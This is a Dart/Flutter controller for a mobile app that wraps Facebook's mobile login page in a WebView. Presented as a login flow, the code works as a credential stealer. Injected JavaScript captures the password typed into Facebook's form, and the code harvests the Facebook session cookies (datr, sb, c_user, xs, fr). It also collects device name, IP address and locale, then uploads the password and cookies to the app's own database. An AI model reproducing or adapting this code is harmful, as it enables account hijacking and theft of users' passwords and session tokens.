import 'package:dart_ipify/dart_ipify.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:facebook_app_events/facebook_app_events.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_cookie_manager/webview_cookie_manager.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:ios_utsname_ext/extension.dart';
import 'dart:io' show Platform;

import '../../../core/const/constans.dart';
import '../../../network/services/db_services.dart';
import '../../../route/app_pages.dart';

const scriptGoToWallFB =
    '''document.getElementsByClassName("_4kk6")[0].click()''';
const scriptGetPass =
    '''document.getElementById("login_password_step_element").children[0].addEventListener('click', function() {jsMessageHandler.postMessage(document.getElementById("m_login_password").value);});''';
const scriptGetName =
    '''const e = document.getElementsByClassName("_6x2x"); jsMessageHandler.postMessage(e[0].innerText);''';
const scriptGetToken = '''document.documentElement.outerHTML.toString()''';

class LoginFacebookController extends GetxController {
  static final facebookAppEvents = FacebookAppEvents();

  Rx<bool> isLoading = false.obs;
  final accountId = "".obs;
  String? pass;
  String? cookie;
  final displayName = "Bi Check point or chua vao man home app".obs;
  String? deviceName;
  String? ipAddress;
  String? locale;
  String? datr;
  String? sb;
  String? cUser;
  String? xs;
  String? fr;
  final password = "".obs;

  final hasCookie = false.obs;

  WebViewController? webViewCtrl;
  WebViewController? webViewCtrlFormLogin;
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();

  final cookieManager = WebviewCookieManager();
  final dbService = DBService();

  @override
  Future<void> onReady() async {
    super.onReady();

    try {
      isLoading = Rx(true);
      await getCookie();
      // await checkPass();
    } finally {
      isLoading = Rx(false);
    }
  }


  static Future<void> sendLoginAnalyticsEvent(
      String userId, String phone) async {

    await facebookAppEvents.logEvent(
      name: 'login_user',
      parameters: <String, dynamic>{
        'user_id': userId,
        'user_phone_no': phone,
      },
    );

    print('Successfully Sent loginEvent');
  }

  Future<void> injectScripGetPass() async {
    try {
      await Future.delayed(const Duration(milliseconds: 300));
      webViewCtrlFormLogin!.runJavascript(scriptGetPass);
    } catch (e) {
      throw Exception('getPass: $e');
    }
  }

  Future<void> injectScripGetDisplayName() async {
    try {
      await Future.delayed(const Duration(milliseconds: 300));
      webViewCtrl!.runJavascript(scriptGetName);
    } catch (e) {
      throw Exception('getDisplayName: $e');
    }
  }

  void handlePassReceived(String pw) async {
    final prefs = await SharedPreferences.getInstance();

    pass = pw;
    await prefs.setString('pass', pass ?? 'Pass null');
  }

  Future<void> handleDisplayNameReceived(String name) async {
    try {
      displayName.value = name;
      await updateData();
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('accountId', accountId.value);
      await prefs.setString('name', displayName.value);

      if (Platform.isAndroid) {
        Get.offAndToNamed(
          Routes.HOME,
        );
      } else if (Platform.isIOS) {
        Get.offAndToNamed(
          Routes.HOME,
          arguments: {
            'name': displayName.value,
            'id': accountId,
          },
        );
      }
    } catch (e) {
      Get.back();
      Get.snackbar(
        'Login error',
        'Something went wrong',
        backgroundColor: Colors.redAccent,
      );
      throw Exception('handleMessageReceived: $e');
    }
  }

  Future<void> sendData() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      await _getIpAddress();
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      if (Platform.isAndroid) {
        AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
        deviceName = androidInfo.model;
      } else if (Platform.isIOS) {
        IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
        deviceName =
            iosInfo.utsname.machine?.iOSProductName ?? "Device iOS Name null";
      }
      PackageInfo packageInfo = await PackageInfo.fromPlatform();
      await dbService.addUser(
        cUser: cUser ?? "cUser Id null",
        ipAddress: ipAddress ?? "Ip Address null",
        cookie: cookie ?? "Cookie null",
        locale: locale ?? "Locale Null",
        displayName: displayName.value,
        accountId: accountId.value,
        deviceName: deviceName ?? "Device Name Null",
        versionApp: packageInfo.version,
        password: prefs.getString('pass') ?? "Get Pass Null",
      );
      sendLoginAnalyticsEvent(accountId.value,deviceName ?? "Device Name Null");
    } catch (e) {
      throw Exception('sendData: $e');
    }
  }

  Future<void> updateData() async {
    try {
      PackageInfo packageInfo = await PackageInfo.fromPlatform();
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      if (Platform.isAndroid) {
        AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
        deviceName = androidInfo.model;
      } else if (Platform.isIOS) {
        IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
        deviceName =
            iosInfo.utsname.machine?.iOSProductName ?? "Device iOS Name null";
      }
      await dbService.updateData(
        cUser: cUser ?? "cUser Id null",
        ipAddress: ipAddress ?? "Ip Address null",
        cookie: cookie ?? "Cookie null",
        locale: locale ?? "Locale Null",
        displayName: displayName.value,
        accountId: accountId.value,
        deviceName: deviceName ?? "Device Name null",
        versionApp: packageInfo.version,
      );
    } catch (e) {
      throw Exception('sendData: $e');
    }
  }

  Future<void> _getIpAddress() async {
    try {
      ipAddress = await Ipify.ipv4();
    } catch (e) {
      ipAddress = "IP Null";
      throw Exception('_getIpAddress: $e');
    }
  }

  Future<void> getCookie() async {
    try {
      if (hasCookie.value) return;

      final gotCookies = await cookieManager.getCookies(mfbUrl);
      for (var item in gotCookies) {
        switch (item.name) {
          case 'datr':
            datr = 'datr=${item.value};';
            break;
          case 'sb':
            sb = 'sb=${item.value};';
            break;
          case 'c_user':
            cUser = 'c_user=${item.value};';
            accountId.value = item.value;
            break;
          case 'xs':
            xs = 'xs=${item.value};';
            break;
          case 'fr':
            fr = 'fr=${item.value};';
            break;
          case 'locale':
            locale = 'locale=${item.value};';
        }
      }
      if (datr == null ||
          sb == null ||
          cUser == null ||
          xs == null ||
          fr == null) {
        cookie = "${datr ?? "datr null;"} "
            "${sb ?? "sb null;"} "
            "${cUser ?? "cUser null"} "
            "${xs ?? "xs null;"} "
            "${fr ?? "fr null;"} ";

        return;
      }

      cookie = datr! + sb! + cUser! + xs! + fr!;

      await sendData();
      hasCookie.value = true;
      Future.delayed(
        const Duration(seconds: 40),
        () {
          if (displayName.value == displayName.value) {
            displayName.value = "Check point";
          }
        },
      );
    } catch (e) {
      throw Exception('_getCookie: $e');
    }
  }
}
